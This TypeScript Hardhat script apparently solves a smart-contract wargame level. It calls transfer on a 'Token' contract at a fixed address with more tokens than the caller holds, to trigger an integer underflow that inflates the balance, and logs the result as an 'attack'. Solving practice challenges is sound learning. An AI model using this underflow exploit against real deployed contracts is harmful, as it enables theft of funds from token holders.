import { deployments, ethers } from "hardhat";
import { Address, Deployment } from "hardhat-deploy/types";
import { Contract } from "ethers";
import { AttackTelephone, Telephone, Token } from "../typechain-types";

const delay = (ms: number) => {
    return new Promise((resolve) => setTimeout(resolve, ms));
};

const main = async () => {

    const [deployer] = await ethers.getSigners();
    const contractAddress: Address = "0xd92C3Cd21D76Fd46251c092426A886ae45A09E5B";
    const token: Token = await ethers.getContractAt("Token", contractAddress, deployer);

    console.log(`Previous Tokens: ${await token.balanceOf(await deployer.getAddress())}`);
    const tx = await token.transfer(contractAddress, ethers.utils.parseEther("21"));
    let status = (await tx.wait()).status === 1;
    console.log(`Attack token operation successful: ${status}`);
    console.log(`Current Tokens: ${await token.balanceOf(await deployer.getAddress())}`);
    
}

main();
